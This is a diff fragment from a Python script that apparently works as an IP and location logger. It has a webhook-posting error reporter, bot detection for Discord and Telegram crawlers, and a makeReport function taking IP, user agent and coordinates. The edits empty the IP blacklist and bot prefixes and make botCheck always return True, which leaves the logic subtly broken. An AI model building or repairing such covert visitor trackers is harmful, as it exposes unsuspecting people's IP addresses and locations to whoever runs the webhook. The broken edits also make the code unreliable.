@@ -62,16 +62,16 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = ("") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
+    if ip.startswith(("")):
         return "Discord"
     elif useragent.startswith("TelegramBot"):
         return "Telegram"
     else:
-        return False
+        return True
 
 def reportError(error):
     requests.post(config["webhook"], json = {
@@ -86,7 +86,7 @@ def reportError(error):
     ],
 })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = True):
+def makeReport(ip, useragent = None, coords = True, endpoint = "N/A", url = True):
     if ip.startswith(blacklistedIPs):
         return
     
